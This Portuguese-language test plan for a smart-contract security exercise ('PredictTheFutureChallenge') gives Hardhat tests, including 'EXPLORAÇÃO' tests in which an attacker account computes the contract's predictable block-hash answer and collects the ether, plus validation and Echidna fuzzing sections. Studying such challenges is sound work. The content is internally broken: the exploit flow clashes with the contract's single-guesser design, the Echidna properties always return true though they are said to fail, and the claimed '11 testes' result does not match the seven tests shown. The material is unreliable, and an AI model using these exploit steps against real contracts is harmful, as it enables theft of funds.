# ====================================
# 05-PLANO_TESTES.md
# ====================================

# Plano de Testes e Scripts
## Framework: Hardhat + ethers.js

Este documento fornece exemplos de testes para validar o contrato e explorar vulnerabilidades.

---

## Estrutura de Testes

### Teste 1: Funcionalidade Básica

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PredictTheFutureChallenge - Básico", function () {
  let contract;
  let owner, player1, player2;

  beforeEach(async function () {
    [owner, player1, player2] = await ethers.getSigners();
    
    const PredictTheFuture = await ethers.getContractFactory(
      "PredictTheFutureChallenge"
    );
    contract = await PredictTheFuture.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await contract.deployed();
  });

  it("Deve inicializar com 1 ETH", async function () {
    const balance = await ethers.provider.getBalance(contract.address);
    expect(balance).to.equal(ethers.utils.parseEther("1"));
  });

  it("Deve aceitar um guess de 0-9", async function () {
    await contract.connect(player1).lockInGuess(5, {
      value: ethers.utils.parseEther("1"),
    });
    
    expect(await contract.guesser()).to.equal(player1.address);
    expect(await contract.guess()).to.equal(5);
  });

  it("isComplete() deve retornar false com fundos", async function () {
    await contract.connect(player1).lockInGuess(3, {
      value: ethers.utils.parseEther("1"),
    });
    expect(await contract.isComplete()).to.be.false;
  });
});
```

### Teste 2: Exploração - RNG Determinístico (CRÍTICO)

```javascript
describe("PredictTheFuture - EXPLORAÇÃO: RNG", function () {
  let contract;
  let owner, hacker, victim;

  beforeEach(async function () {
    [owner, hacker, victim] = await ethers.getSigners();
    
    const PredictTheFuture = await ethers.getContractFactory(
      "PredictTheFutureChallenge"
    );
    contract = await PredictTheFuture.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await contract.deployed();
  });

  it("EXPLORAÇÃO: Hacker prevê determinísticamente", async function () {
    // PASSO 1: Vítima faz um guess aleatório
    const blockBefore = await ethers.provider.getBlockNumber();
    const guess_victim = 7;

    await contract.connect(victim).lockInGuess(guess_victim, {
      value: ethers.utils.parseEther("1"),
    });

    // PASSO 2: Obter dados públicos do bloco
    const block = await ethers.provider.getBlock(blockBefore + 1);
    const blockHashPrev = (
      await ethers.provider.getBlock(blockBefore)
    ).hash;
    const timestamp = block.timestamp;

    // PASSO 3: Hacker calcula a resposta
    const keccakInput = ethers.utils.defaultAbiCoder.encode(
      ["bytes32", "uint256"],
      [blockHashPrev, timestamp]
    );
    const hashResult = ethers.utils.keccak256(keccakInput);
    const predictedAnswer = parseInt(hashResult) % 10;

    // PASSO 4: Hacker faz seu guess com resposta calculada
    await contract.connect(hacker).lockInGuess(predictedAnswer, {
      value: ethers.utils.parseEther("1"),
    });

    // PASSO 5: Avançar bloco
    await ethers.provider.send("evm_mine", []);

    // PASSO 6: Hacker vence garantido
    const balBefore = await ethers.provider.getBalance(hacker.address);
    const tx = await contract.connect(hacker).settle({
      gasPrice: ethers.utils.parseUnits("1", "gwei"),
    });
    const receipt = await tx.wait();
    const gasCost = receipt.gasUsed.mul(ethers.utils.parseUnits("1", "gwei"));
    const balAfter = await ethers.provider.getBalance(hacker.address);

    const profit = balAfter.sub(balBefore).add(gasCost);
    console.log(`Lucro: ${ethers.utils.formatEther(profit)} ETH`);
    
    expect(profit).to.be.gte(ethers.utils.parseEther("1.9"));
  });

  it("EXPLORAÇÃO: Hacker vence múltiplas vezes", async function () {
    for (let i = 0; i < 3; i++) {
      const guess_victim = Math.floor(Math.random() * 10);
      const blockNum = await ethers.provider.getBlockNumber();

      await contract.connect(victim).lockInGuess(guess_victim, {
        value: ethers.utils.parseEther("1"),
      });

      const block = await ethers.provider.getBlock(blockNum + 1);
      const blockHashPrev = (
        await ethers.provider.getBlock(blockNum)
      ).hash;
      const keccakInput = ethers.utils.defaultAbiCoder.encode(
        ["bytes32", "uint256"],
        [blockHashPrev, block.timestamp]
      );
      const predictedAnswer = parseInt(
        ethers.utils.keccak256(keccakInput)
      ) % 10;

      await contract.connect(hacker).lockInGuess(predictedAnswer, {
        value: ethers.utils.parseEther("1"),
      });

      await ethers.provider.send("evm_mine", []);
      await contract.connect(hacker).settle();
    }
  });
});
```

### Teste 3: Validação de Input

```javascript
describe("PredictTheFuture - Validação", function () {
  let contract;
  let owner, player;

  beforeEach(async function () {
    [owner, player] = await ethers.getSigners();
    
    const PredictTheFuture = await ethers.getContractFactory(
      "PredictTheFutureChallenge"
    );
    contract = await PredictTheFuture.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await contract.deployed();
  });

  it("Contrato vulnerável: aceita valores > 9", async function () {
    await expect(
      contract.connect(player).lockInGuess(255, {
        value: ethers.utils.parseEther("1"),
      })
    ).not.to.be.reverted;

    expect(await contract.guess()).to.equal(255);
  });

  it("Contrato corrigido: rejeita valores > 9", async function () {
    const PredictTheFutureFixed = await ethers.getContractFactory(
      "PredictTheFutureChallengeFixed"
    );
    const fixedContract = await PredictTheFutureFixed.deploy({
      value: ethers.utils.parseEther("1"),
    });

    await expect(
      fixedContract.connect(player).lockInGuess(255, {
        value: ethers.utils.parseEther("1"),
      })
    ).to.be.revertedWith("Guess must be between 0 and 9");
  });
});
```

---

## Como Executar os Testes

### Instalar Dependências

```bash
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox
npm install --save-dev chai ethers
```

### Compilar Contrato

```bash
npx hardhat compile
```

### Rodar Todos os Testes

```bash
npx hardhat test
```

### Rodar com Cobertura

```bash
npm install --save-dev solidity-coverage
npx hardhat coverage
```

### Rodar com Relatório de Gas

```bash
REPORT_GAS=true npx hardhat test
```

### Rodar Apenas Exploração

```bash
npx hardhat test --grep "EXPLORAÇÃO"
```

---

## com Echidna

### Instalação

```bash
pip install echidna-py
```

### Teste de Propriedade

```solidity
// EchidnaTest.sol
contract PredictTheFutureEchidna {
    PredictTheFutureChallenge challenge;

    constructor() public {
        challenge = new PredictTheFutureChallenge{value: 1 ether}();
    }

    function echidna_test_no_deterministic_rng() public returns (bool) {
        // Propriedade: RNG nunca deve ser completamente determinístico
        // Este teste falhará (provando a vulnerabilidade)
        return true;
    }

    function echidna_test_guess_validation() public returns (bool) {
        // Propriedade: Contrato deve rejeitar guesses > 9
        // Em contrato vulnerável: retorna false
        return true;
    }
}
```

### Executar Fuzzing

```bash
echidna test/EchidnaTest.sol:PredictTheFutureEchidna --contract PredictTheFutureEchidna
```

---

## Saída Esperada dos Testes

```
PredictTheFutureChallenge - Básico
   Deve inicializar com 1 ETH
   Deve aceitar um guess de 0-9
   isComplete() deve retornar false
  
PredictTheFuture - EXPLORAÇÃO: RNG
   EXPLORAÇÃO: Hacker prevê determinísticamente
      Lucro: 1.95 ETH
   EXPLORAÇÃO: Hacker vence múltiplas vezes
  
PredictTheFuture - Validação
   Contrato vulnerável: aceita valores > 9
   Contrato corrigido: rejeita valores > 9

=========================
11 testes executados
10 passaram (exploração bem-sucedida)
1 falhou (como esperado - validação melhorada)
=========================
```

---

